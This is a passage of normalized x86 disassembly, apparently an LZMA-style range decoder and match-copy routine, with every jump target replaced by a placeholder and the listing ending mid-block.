jmp r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
movzx eax [ edx + ecx * 2 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x20 ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x20 ] eax
mov ecx [ ebp - 0x14 ]
or ecx 0x2
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x20 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x14 ]
or edx 0x4
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x20 ]
add ecx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] ecx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x20 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x20 ] edx
mov eax [ ebp - 0x14 ]
or eax 0x8
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x20 ]
add edx [ ebp - 0x20 ]
mov [ ebp - 0x20 ] edx
jmp r-xdata
mov ecx [ ebp - 0x28 ]
add ecx 0x112
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x2c ]
sub edx 0xc
mov [ ebp - 0x2c ] edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0xffffffff
jne r-xdata
sub_40a680
push ebp
mov ebp esp
sub esp 0x24
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x48 ] 0x112
jae r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x14 ]
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x24 ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp - 0x4 ]
mov eax [ edx + ecx + 0x38 ]
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
sub ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x8 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x2c ]
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x2c ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x48 ]
sub edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x48 ] edx
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0xc ]
sub eax [ edx + 0x2c ]
cmp eax [ ebp - 0x8 ]
ja r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ ecx + 0x24 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x14 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ecx + 0x30 ] eax
mov [ ebp - 0x18 ] 0x0
mov ecx [ ebp - 0x24 ]
mov [ ebp - 0x18 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov [ ebp - 0x20 ] ecx
mov edx [ ebp - 0x8 ]
sub edx 0x1
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x20 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
add edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0xc ]
mov ecx [ ebp - 0x1c ]
mov dl [ ecx + edx ]
mov [ eax ] dl
mov eax [ ebp - 0xc ]
add eax 0x1
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_40a7a0
push ebp
mov ebp esp
sub esp 0x14
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push eax
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
call sub_408ff0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ edx + 0xc ]
sub ecx [ eax + 0x2c ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
sub eax [ edx + 0x24 ]
cmp eax [ ebp - 0xc ]
jbe r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ecx + 0x2c ]
cmp eax [ edx + 0xc ]
jb r-xdata
mov eax [ ebp - 0x14 ]
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
call sub_40a680
mov ecx [ ebp - 0x4 ]
mov edx [ ecx + 0x24 ]
cmp edx [ ebp - 0x8 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ edx + 0xc ]
mov [ ecx + 0x30 ] eax
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x112
jbe r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x18 ]
cmp ecx [ ebp + 0x8 ]
jae r-xdata
xor eax eax
mov ecx [ ebp - 0x4 ]
mov [ ecx + 0x48 ] 0x112
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x48 ] 0x112
jb r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x4 ]
cmp [ ecx + 0x30 ] 0x0
jne r-xdata
sub_40a870
push ebp
mov ebp esp
sub esp 0x68
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x1c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x20 ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp + 0xc ]
add ecx [ ebp + 0x10 ]
mov [ ebp - 0x18 ] ecx
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x10 ]
mov [ ebp - 0x24 ] eax
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x34 ]
mov [ ebp - 0x28 ] edx
mov eax [ ebp + 0x8 ]
mov edx 0x1
mov ecx [ eax + 0x8 ]
shl edx cl
sub edx 0x1
mov eax [ ebp + 0x8 ]
and edx [ eax + 0x2c ]
mov [ ebp - 0x44 ] edx
mov ecx [ ebp - 0x28 ]
shl ecx 0x4
mov edx [ ebp - 0x24 ]
lea eax [ edx + ecx * 2 ]
mov ecx [ ebp - 0x44 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
movzx ecx [ eax ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x180 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x24 ]
add edx 0xe6c
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ edx + 0x24 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx + 0x2c ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x58 ] 0x3
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
lea eax [ edx + ecx * 2 + 0x198 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0x10 ]
movzx edx [ ecx ]
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x28 ] 0x0
mov ecx [ ebp - 0x24 ]
add ecx 0x664
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x58 ] 0x2
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x24 ]
mov [ ebp - 0x5c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x28 ]
mov [ ebp - 0x5c ] ecx
jmp r-xdata
cmp [ ebp - 0x28 ] 0x7
jae r-xdata
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jae r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x38 ] edx
mov eax [ ebp - 0x38 ]
movzx ecx [ eax ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx 0x4
imul edx edx 0x0
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
cmp eax [ ecx + edx + 0x38 ]
jae r-xdata
mov [ ebp - 0x30 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx 0x1
mov ecx [ ecx + 0x4 ]
shl edx cl
sub edx 0x1
mov eax [ ebp + 0x8 ]
and edx [ eax + 0x2c ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
shl edx cl
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov eax [ ebp - 0x5c ]
movzx eax [ ecx + eax - 0x1 ]
mov ecx [ ebp + 0x8 ]
mov esi 0x8
sub esi [ ecx ]
mov ecx esi
sar eax cl
add edx eax
imul edx edx 0x300
mov eax [ ebp - 0x10 ]
lea ecx [ eax + edx * 2 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
lea ecx [ eax + edx * 2 + 0x1b0 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x28 ]
shl eax 0x4
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax * 2 + 0x1e0 ]
mov eax [ ebp - 0x44 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0x10 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
shl edx 0x8
mov eax [ ebp + 0xc ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0x8 ] edx
mov edx [ ebp + 0xc ]
add edx 0x1
mov [ ebp + 0xc ] edx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x60 ] 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x28 ]
mov [ ebp - 0x60 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0x10 ]
add ecx 0x2
mov [ ebp - 0x38 ] ecx
mov edx [ ebp - 0x38 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x44 ]
shl edx 0x3
mov eax [ ebp - 0x10 ]
lea ecx [ eax + edx * 2 + 0x4 ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x48 ] 0x8
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov eax 0x4
imul eax eax 0x0
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov ecx [ ecx + 0x24 ]
sub ecx [ edx + eax + 0x38 ]
add ecx [ ebp - 0x60 ]
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x14 ]
movzx ecx [ eax + ecx ]
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] 0x100
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x30 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x30 ] ecx
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x30 ]
mov [ ebp - 0x30 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x24 ]
lea edx [ ecx + eax * 2 + 0x1c8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0x10 ]
movzx ecx [ eax ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x34 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x40 ]
and edx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x34 ]
add ecx [ ebp - 0x34 ]
mov [ ebp - 0x34 ] ecx
mov edx [ ebp - 0x50 ]
not edx
and edx [ ebp - 0x40 ]
mov [ ebp - 0x40 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x30 ]
mov eax [ ebp - 0x10 ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x14 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
jmp r-xdata
cmp [ ebp - 0x30 ] 0x100
jb r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x14 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0xc ]
jae r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ ebp - 0x18 ]
jb r-xdata
mov [ ebp - 0x28 ] 0xc
mov ecx [ ebp - 0x24 ]
add ecx 0xa68
mov [ ebp - 0x10 ] ecx
mov eax 0x3
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x10 ]
add eax 0x204
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x54 ] 0x10
mov [ ebp - 0x48 ] 0x100
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x44 ]
shl ecx 0x3
mov edx [ ebp - 0x10 ]
lea eax [ edx + ecx * 2 + 0x104 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x54 ] 0x8
mov [ ebp - 0x48 ] 0x8
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
add eax 0x1
mov [ ebp + 0xc ] eax
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x14 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
cmp edx [ ebp - 0xc ]
jae r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx [ ebp - 0x18 ]
jb r-xdata
mov edx [ ebp - 0x4c ]
shl edx 0x1
mov [ ebp - 0x4c ] edx
mov eax [ ebp - 0x4c ]
and eax [ ebp - 0x40 ]
mov [ ebp - 0x50 ] eax
mov ecx [ ebp - 0x40 ]
mov edx [ ebp - 0x10 ]
lea eax [ edx + ecx * 2 ]
mov ecx [ ebp - 0x50 ]
lea edx [ eax + ecx * 2 ]
mov eax [ ebp - 0x34 ]
lea ecx [ edx + eax * 2 ]
mov [ ebp - 0x68 ] ecx
mov edx [ ebp - 0x68 ]
movzx eax [ edx ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov [ ebp - 0x58 ] 0x1
jmp r-xdata
cmp [ ebp - 0x34 ] 0x100
jb r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov ecx [ ebp - 0xc ]
mov [ ebp - 0x4 ] ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x8 ]
shl ecx 0x8
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0xc ]
add ecx 0x1
mov [ ebp + 0xc ] ecx
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x8 ]
shl eax 0x8
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
